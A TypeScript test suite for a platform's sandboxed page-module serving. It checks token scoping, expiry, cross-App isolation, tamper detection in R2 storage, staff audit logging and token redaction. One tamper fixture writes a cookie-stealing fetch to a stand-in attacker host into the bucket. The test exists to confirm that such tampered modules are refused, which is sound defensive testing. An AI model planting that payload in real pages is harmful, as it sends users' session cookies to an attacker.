import type { AuditEvent } from "@grasp-os/shared/audit";
import { appIdSchema } from "@grasp-os/shared/ids";
import { env } from "cloudflare:workers";
import { describe, expect, it, vi } from "vite-plus/test";

import { frameAccess, frameKey, stageFrame } from "../src/page-frame.ts";
import { revokeRelease } from "../src/release-retention.ts";
import { withFiles } from "./app-definitions.ts";
import { release } from "./apps.ts";
import { mockIdp } from "./idp.ts";
import {
  frameDocument,
  loadFrame,
  moduleKeyOf,
  modulePartsOf,
  modulePath,
  pathOf,
  routed,
} from "./page-frames.ts";
import type { LoadedFrame, ModuleParts } from "./page-frames.ts";
import { deskDraft, deskFiles } from "./preview-drafts.ts";
import { chatsOf, chatWithDraft, refreshed } from "./previews.ts";
import { person as actingPerson } from "./sealed-apps.ts";
import {
  auditedDuring,
  openRpc,
  outcome,
  signedIn,
  signedInApi,
  staffPerson,
} from "./sign-in.ts";

// A page's modules on content-hashed addresses (core's page-frame.ts),
// from its threat model. A frame is sandboxed with an opaque origin, so its
// module requests carry no cookie: what lets one in is a token core made
// for one scope of modules (a preview's, or a published build's), which
// expires. The ways it can fail:
//
// - The token is read where its URL is logged: the router's and core's
//   traces (the router's sit in Grasp's account, so Grasp staff could read
//   a client's App code there without an audit entry), core's request log,
//   a Referer. It travels in the query alone, which Workers redact from
//   logs and traces, never in a path.
// - A token that isn't core's, is past its lifetime (an hour for a
//   preview, six for a published build), or is another scope's, reads a
//   module.
// - A frame reads another App's module, or another chat's draft's, by its
//   hash, or one of a release revoked since, with the token of the release
//   after it.
// - Bytes changed in R2, or moved there from another scope, are served as
//   if core staged them.
// - Grasp staff mint a token, and so read App code, without an audit entry.
// - A token leaves in what the frame reports: a stack or a message names
//   a module's whole address, query and all, and is kept in the App's
//   error log or a preview's reports, which reach the agent and its model.
// - A shared cache keeps a module for others, or its address leaves as a
//   Referer.

const idp = mockIdp();

/** A frame's document and modules, as core serves them for `open`. */
const framed = async (open: {
  artifact: string;
  frameToken: string;
}): Promise<LoadedFrame> => {
  const frame = await loadFrame(open);
  if (frame === null) {
    throw new Error("An opened page has a frame");
  }
  return frame;
};

/** The address of `frame`'s page module. */
const pageModuleOf = (frame: LoadedFrame): string =>
  frame.addresses["app~src~routes~index.js"] ?? "";

/** What core answers for the module at `scope`, under `token`, by its `hash`. */
const asked = async (parts: ModuleParts): Promise<number> => {
  const response = await routed(modulePath(parts));
  return response.status;
};

/** `run` as if the clock read `ago` ms before now. */
const before = async <T>(ago: number, run: () => Promise<T>): Promise<T> => {
  vi.useFakeTimers({ toFake: ["Date"], now: Date.now() - ago });
  try {
    return await run();
  } finally {
    vi.useRealTimers();
  }
};

const minute = 60 * 1000;
const hour = 60 * minute;

/** A page that imports a component of its App, which `marker` names. */
const withComponent = (marker: string): Record<string, string> => ({
  "src/components/badge.tsx": `export function Badge() {
  return <strong>${marker}</strong>;
}
`,
  "src/routes/index.tsx": `import { createFileRoute } from "@tanstack/react-router";
import { Badge } from "../components/badge";

function Desk() {
  return <main><Badge /></main>;
}
export const Route = createFileRoute("/")({ component: Desk });
`,
});

const appImport = /\.\/[0-9a-f]{64}\.js[^"'\s]*/gu;

/**
 * Where `frame` names a module and the token it names it with: every
 * address in its document (import map, integrity, its page module) and
 * every import of the App's modules it loads, as a browser resolves them.
 */
const namedAddresses = (frame: LoadedFrame): string[] => [
  frame.page.entry,
  ...Object.values(frame.addresses),
  ...Object.keys(frame.integrity),
  ...Object.entries(frame.modules)
    .filter(([name]) => name.startsWith("app~"))
    .flatMap(([name, code]) =>
      [...code.matchAll(appImport)].map(
        ([specifier]) => new URL(specifier, frame.addresses[name]).href
      )
    ),
];

/** What a test reads of an answer's headers. */
const headersOf = (response: Response) => ({
  status: response.status,
  cache: response.headers.get("cache-control"),
  referrer: response.headers.get("referrer-policy"),
});

/** The staff entries among `events`, by the surface each names. */
const staffSurfaces = (events: readonly AuditEvent[]): unknown[] =>
  events
    .filter(({ action }) => action === "staff.accessed")
    .map(({ detail }) => detail.surface);

/** A problem a page reports as engines write it: each frame names its module's whole address. */
const problemOf = (address: string) => ({
  kind: "error" as const,
  message: `Failed to fetch dynamically imported module: ${address}`,
  stack: `Error: boom\n    at Desk (${address}:3:9)`,
});

describe(
  "a page's modules on content-hashed addresses",
  { timeout: 180_000 },
  () => {
    it("carries a module's token in the query alone: in no path the router or core logs", async () => {
      const builder = await signedInApi(idp, "builder");
      const { id } = await builder.api.apps.create({ name: "Desk" });
      const app = appIdSchema.parse(id);
      await release(
        builder,
        app,
        withFiles(deskFiles(), {
          ...withComponent("Live"),
        })
      );
      const published = await framed(await builder.api.pages.open(app));
      const { chatId } = await chatWithDraft(
        builder,
        app,
        withComponent("Draft")
      );
      const preview = await framed(
        await builder.api.chats.preview(chatId, app)
      );
      const info = vi.spyOn(console, "info").mockReturnValue();
      let lines: string[] = [];
      try {
        await routed(pathOf(published.page.entry));
        await routed(pathOf(preview.page.entry));
        lines = info.mock.calls.map((call) => JSON.stringify(call));
      } finally {
        info.mockRestore();
      }
      const checked = [published, preview].map((frame) => {
        const named = namedAddresses(frame);
        const tokens = new Set(
          named.map((address) => new URL(address).searchParams.get("token"))
        );
        return {
          // The App's module imports the component's, under its own token.
          importsComponent: Object.entries(frame.modules).some(
            ([name, code]) =>
              name.startsWith("app~") && code.match(appImport) !== null
          ),
          everyAddressHasToken: !tokens.has(null) && !tokens.has(""),
          tokenInPath: named.filter((address) =>
            [...tokens].some(
              (token) =>
                token !== null && new URL(address).pathname.includes(token)
            )
          ),
          tokenInPolicy: [...frame.policy.values()]
            .flat()
            .filter((source) => source.includes("?")),
          logged: lines.filter((line) =>
            [...tokens].some((token) => token !== null && line.includes(token))
          ),
        };
      });
      const expected = {
        importsComponent: true,
        everyAddressHasToken: true,
        tokenInPath: [],
        tokenInPolicy: [],
        logged: [],
      };
      expect(checked).toStrictEqual([expected, expected]);
      expect(
        lines.filter((line) => line.includes("/page-modules/"))
      ).toHaveLength(2);
    });

    it("refuses a module asked with no token, one that isn't core's, or one for another scope", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId } = await deskDraft(builder);
      const frame = await framed(await builder.api.chats.preview(chatId, app));
      const own = modulePartsOf(pageModuleOf(frame));
      const [expires = ""] = own.token.split(".");
      const kitAddress = Object.values(frame.addresses).find((address) =>
        new URL(address).pathname.startsWith("/page-modules/kit-")
      );
      const kit = modulePartsOf(kitAddress ?? "");
      const noToken = await routed(`/page-modules/${own.scope}/${own.hash}.js`);
      // A token for this scope, in the path as it once was.
      const inPath = await routed(
        `/page-modules/${own.scope}/${own.token}/${own.hash}.js`
      );
      expect({
        own: await asked(own),
        noToken: noToken.status,
        forged: await asked({ ...own, token: `${expires}.AAAA` }),
        // The kit's token, for the kit's scope alone.
        othersToken: await asked({ ...own, token: kit.token }),
        inPath: inPath.status,
      }).toStrictEqual({
        own: 200,
        noToken: 403,
        forged: 403,
        othersToken: 403,
        inPath: 404,
      });
    });

    it("holds a preview's token for at most an hour and a published build's for at most six", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId } = await deskDraft(builder);
      const previewAt = async (ago: number): Promise<ModuleParts> =>
        await before(ago, async () =>
          modulePartsOf(
            pageModuleOf(
              await framed(await builder.api.chats.preview(chatId, app))
            )
          )
        );
      const publishedAt = async (ago: number): Promise<ModuleParts> =>
        await before(ago, async () =>
          modulePartsOf(
            pageModuleOf(await framed(await builder.api.pages.open(app)))
          )
        );
      expect({
        preview: {
          halfAnHour: await asked(await previewAt(29 * minute)),
          anHour: await asked(await previewAt(61 * minute)),
        },
        published: {
          threeHours: await asked(await publishedAt(3 * hour - minute)),
          sixHours: await asked(await publishedAt(6 * hour + minute)),
        },
      }).toStrictEqual({
        preview: { halfAnHour: 200, anHour: 403 },
        published: { threeHours: 200, sixHours: 403 },
      });
    });

    it("reads only modules of its own preview's scope: not another App's, nor another chat's draft's, by their hashes", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId } = await deskDraft(builder);
      const own = await framed(await builder.api.chats.preview(chatId, app));
      // Another App of the same builder, published.
      const { id: otherId } = await builder.api.apps.create({ name: "Other" });
      await release(builder, otherId, deskFiles("Other"));
      const otherApp = await framed(await builder.api.pages.open(otherId));
      // Another chat's draft of the same App.
      const { chatId: otherChat } = await chatWithDraft(builder, app, {
        "src/routes/index.tsx":
          deskFiles("Elsewhere").files["src/routes/index.tsx"] ?? "",
      });
      const otherDraft = await framed(
        await builder.api.chats.preview(otherChat, app)
      );
      const mine = modulePartsOf(pageModuleOf(own));
      const theirs = [otherApp, otherDraft].map((frame) =>
        modulePartsOf(pageModuleOf(frame))
      );
      expect({
        own: await asked(mine),
        // Its hash, under the frame's own scope and token: kept nowhere there.
        underOwnScope: await Promise.all(
          theirs.map(async ({ hash }) => await asked({ ...mine, hash }))
        ),
        // Its hash and scope, under the frame's token: not that scope's.
        underOwnToken: await Promise.all(
          theirs.map(
            async ({ scope, hash }) => await asked({ ...mine, scope, hash })
          )
        ),
      }).toStrictEqual({
        own: 200,
        underOwnScope: [404, 404],
        underOwnToken: [403, 403],
      });
    });

    it("reads no module of a release revoked since, with the token of the release after it", async () => {
      const builder = await signedInApi(idp, "builder");
      const { id } = await builder.api.apps.create({ name: "Desk" });
      const app = appIdSchema.parse(id);
      await release(builder, app, deskFiles("First"));
      const first = await framed(await builder.api.pages.open(app));
      await release(builder, app, deskFiles("Second"));
      await revokeRelease(
        env,
        await actingPerson("admin"),
        { app, version: 1 },
        "Leaks data"
      );
      const second = await framed(await builder.api.pages.open(app));
      const revoked = modulePartsOf(pageModuleOf(first));
      const current = modulePartsOf(pageModuleOf(second));
      expect({
        current: await asked(current),
        underCurrentScope: await asked({ ...current, hash: revoked.hash }),
        underCurrentToken: await asked({
          ...current,
          scope: revoked.scope,
          hash: revoked.hash,
        }),
      }).toStrictEqual({
        current: 200,
        underCurrentScope: 404,
        underCurrentToken: 403,
      });
    });

    it("serves no module whose bytes were changed in R2, or moved there from another scope, and stages it again at the next update", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId, revision } = await deskDraft(builder);
      const opened = await builder.api.chats.preview(chatId, app);
      const frame = await framed(opened);
      const { chatId: otherChat } = await chatWithDraft(builder, app, {
        "src/routes/index.tsx":
          deskFiles("Elsewhere").files["src/routes/index.tsx"] ?? "",
      });
      const other = await framed(
        await builder.api.chats.preview(otherChat, app)
      );
      const address = pageModuleOf(frame);
      const key = moduleKeyOf(address);
      const staged = await env.FILES.get(key);
      const original = await staged?.text();
      // Whoever can write the bucket swaps the module's code, and keeps
      // what else core stored beside it.
      const tamper = async (): Promise<void> => {
        await env.FILES.put(
          key,
          'fetch("https://attacker.example/" + document.cookie);',
          { customMetadata: staged?.customMetadata ?? {} }
        );
      };
      await tamper();
      // The frame opened again: its import map would vouch for the bytes.
      const reopened = await frameDocument(opened);
      const atOpen = {
        status: reopened.status,
        cache: reopened.headers.get("cache-control"),
        module: (await env.FILES.head(key)) === null,
        manifest: (await env.FILES.head(frameKey(opened.artifact))) === null,
      };
      // Or the frame already open asks for it.
      await tamper();
      const tampered = await routed(pathOf(address));
      const removed = (await env.FILES.head(key)) === null;
      // Or moves another chat's module into this scope, with its MAC.
      const elsewhere = await env.FILES.get(moduleKeyOf(pageModuleOf(other)));
      const otherHash = modulePartsOf(pageModuleOf(other)).hash;
      const moved = modulePath({ ...modulePartsOf(address), hash: otherHash });
      await env.FILES.put(
        moduleKeyOf(`https://core${moved}`),
        (await elsewhere?.text()) ?? "",
        { customMetadata: elsewhere?.customMetadata ?? {} }
      );
      const movedResponse = await routed(moved);
      const movedServed = movedResponse.status;
      // The next update stages what it loads again, from core's own build.
      const updated = await builder.api.chats.previewUpdate(
        chatId,
        app,
        revision,
        {}
      );
      const healed = await routed(pathOf(address));
      expect({
        atOpen,
        tampered: {
          status: tampered.status,
          cache: tampered.headers.get("cache-control"),
        },
        removed,
        moved: movedServed,
        sameModule: Object.keys(refreshed(updated).modules).includes(
          modulePartsOf(address).hash
        ),
        healed: { status: healed.status, code: await healed.text() },
      }).toStrictEqual({
        atOpen: {
          status: 404,
          cache: "no-store",
          module: true,
          manifest: true,
        },
        tampered: { status: 404, cache: "no-store" },
        removed: true,
        moved: 404,
        sameModule: true,
        healed: { status: 200, code: original },
      });
    });

    it("refuses a frame opened over an hour ago its next update's modules, which a frame opened again reads", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId, revision, write } = await deskDraft(builder);
      const frame = await before(
        61 * minute,
        async () => await framed(await builder.api.chats.preview(chatId, app))
      );
      const next = await write(
        {
          "src/routes/index.tsx":
            deskFiles("Later").files["src/routes/index.tsx"] ?? "",
        },
        revision
      );
      const updated = await builder.api.chats.previewUpdate(
        chatId,
        app,
        next,
        {}
      );
      const hash = refreshed(updated).entry;
      // What the page does on the frame's `reset`: opens it again.
      const reopened = await framed(
        await builder.api.chats.preview(chatId, app)
      );
      expect({
        expired: await asked({ ...modulePartsOf(frame.page.entry), hash }),
        reopened: await asked({
          ...modulePartsOf(reopened.page.entry),
          hash,
        }),
      }).toStrictEqual({ expired: 403, reopened: 200 });
    });

    it("stages again what it kept under a key since rotated, rather than refuse it as corrupt", async () => {
      const artifact = "e".repeat(64);
      const code = {
        entry: "app~desk",
        runtime: "app~desk",
        modules: { "app~desk": "export default 1;\n" },
        addresses: { "app~desk": "f".repeat(64) },
        kit: {},
        css: "",
      };
      // Staged under the secret before a rotation, then again after it.
      await stageFrame(
        { ...env, BETTER_AUTH_SECRET: `${env.BETTER_AUTH_SECRET}-before` },
        artifact,
        code
      );
      await stageFrame(env, artifact, code);
      const frame = await loadFrame({
        artifact,
        frameToken: await frameAccess(env, artifact),
      });
      expect(frame?.modules["app~desk"]).toBe(code.modules["app~desk"]);
    });

    it("mints no token for Grasp staff, and records each ask for a page's frame or a preview's", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId } = await deskDraft(builder);
      const session = await signedIn(idp, "grasp-staff", staffPerson());
      const { core } = await openRpc(session);
      const staff = core.authenticate();
      const answers: string[] = [];
      const events = await auditedDuring(
        async () => {
          answers.push(
            await outcome(staff.pages.open(app)),
            await outcome(staff.chats.preview(chatId, app))
          );
        },
        { staffAccesses: true }
      );
      expect({ answers, surfaces: staffSurfaces(events) }).toStrictEqual({
        answers: ["role.forbidden", "role.forbidden"],
        surfaces: ["pages.open", "chats.preview"],
      });
    });

    it("serves a module privately and immutably, and lets neither it nor its frame send a referrer", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId } = await deskDraft(builder);
      const opened = await builder.api.chats.preview(chatId, app);
      const frame = await framed(opened);
      const own = modulePartsOf(pageModuleOf(frame));
      const [document, served, refused, missing] = await Promise.all([
        frameDocument(opened),
        routed(modulePath(own)),
        routed(modulePath({ ...own, token: "1.AAAA" })),
        // A hash kept nowhere, under the frame's own valid token.
        routed(modulePath({ ...own, hash: "0".repeat(64) })),
      ]);
      expect({
        document: {
          cache: headersOf(document).cache,
          referrer: headersOf(document).referrer,
        },
        served: headersOf(served),
        refused: headersOf(refused),
        missing: headersOf(missing),
      }).toStrictEqual({
        document: { cache: "no-store", referrer: "no-referrer" },
        served: {
          status: 200,
          cache: "private, max-age=3600, immutable",
          referrer: "no-referrer",
        },
        refused: { status: 403, cache: "no-store", referrer: "no-referrer" },
        missing: { status: 404, cache: "no-store", referrer: "no-referrer" },
      });
    });

    it("keeps no token from a reported stack or message in the App's error log or a preview's reports", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId, revision } = await deskDraft(builder);
      const frame = await framed(await builder.api.chats.preview(chatId, app));
      const published = await framed(await builder.api.pages.open(app));
      await builder.api.pages.report(
        app,
        { version: 1, path: "/" },
        problemOf(pageModuleOf(published))
      );
      await builder.api.chats.previewReport(
        chatId,
        app,
        revision,
        "/",
        problemOf(pageModuleOf(frame))
      );
      const { entries } = await builder.api.pages.errors(app);
      const reported = await chatsOf(builder).previewReports(
        chatId,
        app,
        revision,
        0
      );
      const tokens = [published, frame].map(
        (opened) => modulePartsOf(pageModuleOf(opened)).token
      );
      const kept = JSON.stringify({ entries, problems: reported.problems });
      const { pathname } = new URL(pageModuleOf(published));
      expect({
        withToken: tokens.filter((token) => kept.includes(token)),
        withQuery: kept.includes("?token="),
        // What the address says of where the module is stays.
        path: kept.includes(`${pathname}:3:9`),
      }).toStrictEqual({ withToken: [], withQuery: false, path: true });
    });
  }
);
